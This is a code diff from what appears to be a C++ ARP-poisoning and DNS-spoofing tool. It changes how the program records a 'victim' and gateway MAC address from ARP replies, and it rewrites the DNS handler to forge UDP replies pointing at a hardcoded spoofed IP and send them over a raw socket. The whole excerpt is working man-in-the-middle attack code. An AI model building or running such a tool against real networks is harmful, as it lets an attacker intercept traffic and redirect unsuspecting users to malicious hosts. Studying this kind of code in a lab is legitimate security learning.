@@ -59,14 +59,14 @@ int main(int argc, const char *argv[]) {
                     }
                     victimMacSet = true;
                     std::cout << "victim mac acquired" << std::endl;
-                } else if (tmp->s_addr == gatewayIp.s_addr) {
+                }
+
+                if (tmp->s_addr == gatewayIp.s_addr) {
                     for (int i = 0; i < ETH_ALEN; i++) {
                         gatewayMac[i] = arp->arp_sha[i];
                     }
                     gatewayMacSet = true;
                     std::cout << "gateway mac acquired" << std::endl;
-                } else {
-                    std::cout << "received unwanted arp reply" << std::endl;
                 }
             }
         });
@@ -166,7 +166,6 @@ void dnsSpoof(NetworkEngine *net) {
 
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet) {
-    NetworkEngine *net = (NetworkEngine *)args;
     // tmp fake spoofing address
     struct in_addr spoofIp;
     spoofIp.s_addr = 0x1300a8c0;
@@ -203,6 +202,19 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     std::cout << "craft a response with size: " << buffer.size() << std::endl;
 
     // reply
-    net->sendUdp(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
+    int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    struct sockaddr_in sin;
+
+    UdpStack udpStack(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
+    UCharVector frame = udpStack.getPacket();
+
+    sin.sin_family = AF_INET;
+    sin.sin_port = udpStack.udp.source;
+    sin.sin_addr.s_addr = udpStack.ip.daddr;
+
+    sendto(rawSocket, frame.data(), frame.size(), 0, (struct sockaddr *)&sin, sizeof(sin));
     std::cout << "sending reply" << std::endl;
+
+    close(rawSocket);
 }
